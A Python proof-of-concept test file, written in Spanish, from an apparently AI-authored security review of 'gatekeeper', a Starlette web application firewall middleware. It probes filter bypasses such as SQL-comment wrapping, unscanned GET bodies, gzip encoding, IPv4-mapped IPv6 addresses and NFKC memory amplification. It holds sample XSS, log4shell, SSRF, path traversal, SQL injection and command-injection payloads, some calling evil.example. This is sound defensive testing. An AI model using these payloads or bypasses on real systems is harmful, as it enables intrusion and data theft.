"""PoC de la revisión independiente (IA). Ver SECURITY_REVIEW-IA.md.

Convención: PASA = la propiedad se cumple; FALLA = hay un hallazgo.
"""
from __future__ import annotations

import gzip
import json

from gatekeeper import Config, GatekeeperMiddleware
from gatekeeper.rules import scan_detailed
from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import JSONResponse
from starlette.routing import Route
from starlette.testclient import TestClient

PASA, FALLA, INFO = "PASA", "FALLA", "INFO"


def _app(**cfg: object) -> Starlette:
    async def echo(request: Request) -> JSONResponse:
        raw = await request.body()
        return JSONResponse({"len": len(raw)})

    app = Starlette(routes=[Route("/{p:path}", echo, methods=["GET", "POST", "HEAD", "OPTIONS"])])
    cfg.setdefault("rate_limit", 0)
    app.add_middleware(GatekeeperMiddleware, config=Config(**cfg))  # type: ignore[arg-type]
    return app


def _cliente(**cfg: object) -> TestClient:
    return TestClient(_app(**cfg), raise_server_exceptions=False)


def poc_ia_comentario_universal(resultados: list[tuple[str, str, str]]) -> None:
    """IA-1: envolver el payload en `/*...*/` lo esconde de TODAS las familias, no solo sqli."""
    c = _cliente()
    casos = {
        "xss": "<script>alert(1)</script>",
        "ssti": "{{7*7}}",
        "log4shell": "${jndi:ldap://evil.example/a}",
        "cmdi": "$(id)",
        "crlf": "x%0d%0aSet-Cookie:a=b",
        "path_traversal": "../../etc/passwd",
        "ssrf": "http://169.254.169.254/latest/meta-data/",
    }
    rotos = []
    for familia, payload in casos.items():
        directo = c.get("/", params={"q": payload}).status_code
        envuelto = c.get("/", params={"q": f"/*{payload}*/"}).status_code
        if directo in (400, 403) and envuelto == 200:
            rotos.append(familia)
    if rotos:
        resultados.append((
            FALLA,
            "IA-1: `/*payload*/` esconde el ataque en TODAS las familias",
            (f"familias que se saltan envueltas en comentario SQL: {rotos} "
            f"(de {list(casos)}); normalize() aplica _strip_sql_comments() "
            "al texto COMPLETO antes de evaluar cualquier familia, no solo sqli"),
        ))
    else:
        resultados.append((PASA, "IA-1: el envoltorio en comentario no esconde otras familias", ""))


def poc_ia_metodos_sin_body(resultados: list[tuple[str, str, str]]) -> None:
    """IA-2: un body JSON en GET/HEAD/OPTIONS no se inspecciona (BODY_METHODS es una lista cerrada)."""
    c = _cliente()
    atk = json.dumps({"q": "1 union select password from users"})
    colados = []
    for metodo in ("GET", "HEAD", "OPTIONS"):
        r = c.request(metodo, "/", content=atk, headers={"content-type": "application/json"})
        if r.status_code == 200:
            colados.append(metodo)
    if colados:
        resultados.append((
            FALLA,
            "IA-2: body JSON con ataque no se inspecciona en métodos sin body",
            (f"métodos que dejan pasar el body sin inspeccionar: {colados}; "
            "afecta a apps que leen el body en GET (búsqueda tipo Elasticsearch, "
            "GraphQL por GET). No está en docs/amenazas.md"),
        ))
    else:
        resultados.append((PASA, "IA-2: GET/HEAD/OPTIONS con body se inspeccionan", ""))


def poc_ia_content_encoding(resultados: list[tuple[str, str, str]]) -> None:
    """IA-3: un body comprimido (gzip) con Content-Encoding no se descomprime antes de inspeccionar."""
    c = _cliente()
    atk = json.dumps({"q": "1 union select password from users"})
    r_claro = c.post("/", content=atk, headers={"content-type": "application/json"})
    r_gzip = c.post(
        "/", content=gzip.compress(atk.encode()),
        headers={"content-type": "application/json", "content-encoding": "gzip"},
    )
    if r_claro.status_code == 403 and r_gzip.status_code == 200:
        resultados.append((
            FALLA,
            "IA-3: Content-Encoding: gzip esquiva la inspección del body",
            (f"en claro -> {r_claro.status_code}; comprimido -> {r_gzip.status_code}. "
            "Solo es explotable si la app descomprime el body ella misma "
            "(Starlette/FastAPI no lo hacen por defecto; un proxy delante sí podría)"),
        ))
    else:
        resultados.append((PASA, "IA-3: Content-Encoding no cambia el veredicto", ""))


def poc_ia_ipv4_mapeada_bloqueo(resultados: list[tuple[str, str, str]]) -> None:
    """IA-4: blocked_ips no reconoce la IP si llega como IPv4-mapeada-en-IPv6 (::ffff:a.b.c.d)."""
    from gatekeeper.ratelimit import normalize_rate_key

    cfg = Config(rate_limit=0, blocked_ips={"203.0.113.7"})
    directa = cfg.blocked_match("203.0.113.7")
    mapeada = cfg.blocked_match("::ffff:203.0.113.7")
    clave_directa = normalize_rate_key("203.0.113.7", 64)
    clave_mapeada = normalize_rate_key("::ffff:203.0.113.7", 64)
    if directa is not None and mapeada is None:
        resultados.append((
            FALLA,
            "IA-4: blocked_ips no reconoce la IPv4-mapeada-en-IPv6",
            (f"blocked_match('203.0.113.7')={directa!r} vs "
            f"blocked_match('::ffff:203.0.113.7')={mapeada!r}. "
            f"El rate limiter SÍ la normaliza (normalize_rate_key da "
            f"{clave_directa!r} y {clave_mapeada!r} iguales): inconsistencia "
            "interna, no una decisión de diseño. Explotable si scope['client'] "
            "reporta la forma mapeada (sockets dual-stack IPv6, algunos proxies)"),
        ))
    else:
        resultados.append((PASA, "IA-4: blocked_ips reconoce la IPv4-mapeada", ""))


def poc_ia_nfkc_amplificacion_medida(resultados: list[tuple[str, str, str]]) -> None:
    """IA-5: la amplificación NFKC medida (U+FDFA) supera el 4x que documenta ALCANCE.md."""
    import time
    import tracemalloc
    import unicodedata

    ch = "\ufdfa"  # el carácter con mayor expansión NFKC de todo el BMP+astral
    n = (262_144 - 12) // len(ch.encode("utf-8"))
    body = json.dumps({"a": ch * n}, ensure_ascii=False).encode("utf-8")
    c = _cliente()
    tracemalloc.start()
    t0 = time.perf_counter()
    r = c.post("/", content=body, headers={"content-type": "application/json"})
    dt = time.perf_counter() - t0
    _cur, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    factor = peak / len(body)
    if factor > 110 and r.status_code == 200:
        resultados.append((
            FALLA,
            "IA-5: amplificación NFKC medida excede el 4x documentado",
            (f"body {len(body)} B (límite exacto) -> HTTP {r.status_code} en "
            f"{dt * 1000:.0f} ms, pico de memoria {peak / 1e6:.1f} MB "
            f"({factor:.0f}x el body). U+FDFA se expande x18 con "
            f"unicodedata.normalize('NFKC', ...): {len(unicodedata.normalize('NFKC', ch))} "
            "caracteres por 1 de entrada"),
        ))
    else:
        resultados.append((PASA, "IA-5: la amplificación NFKC está dentro de lo documentado", ""))


def poc_ia_cmdi_binarios_comunes(resultados: list[tuple[str, str, str]]) -> None:
    """IA-6 (observación, no hallazgo): binarios habituales que `cmdi` no reconoce tras `;`."""
    comunes = [
        "touch /tmp/x", "echo pwned", "tee /tmp/x", "awk 'BEGIN{system(1)}'",
        "find / -exec id ;", "xargs id", "nohup id", "timeout 1 id", "busybox id",
        "php -r 'system(1);'", "node -e 1", "telnet evil.example 80", "ssh evil.example",
    ]
    faltan = [cmd for cmd in comunes if not scan_detailed(f"h=1.1.1.1;{cmd}")]
    resultados.append((
        INFO,
        "IA-6 (observación): binarios comunes sin firma en `cmdi`",
        (f"{len(faltan)}/{len(comunes)} no detectados: {faltan}. La familia "
        "`cmdi` es explícitamente por lista cerrada de binarios (ver "
        "docs/amenazas.md); esto NO contradice ninguna promesa documentada, "
        "se deja como dato para decidir si ampliar la lista"),
    ))


COMPROBACIONES = [
    ("ia_comentario", poc_ia_comentario_universal, "el envoltorio /*...*/ esconde el ataque en toda familia"),
    ("ia_metodos", poc_ia_metodos_sin_body, "GET/HEAD/OPTIONS con body no se inspeccionan"),
    ("ia_encoding", poc_ia_content_encoding, "Content-Encoding: gzip esquiva la inspección"),
    ("ia_ipv4mapeada", poc_ia_ipv4_mapeada_bloqueo, "blocked_ips vs IPv4-mapeada-en-IPv6"),
    ("ia_nfkc", poc_ia_nfkc_amplificacion_medida, "amplificación NFKC medida en el límite de body"),
    ("ia_cmdi_binarios", poc_ia_cmdi_binarios_comunes, "binarios comunes sin firma en cmdi (observación)"),
]
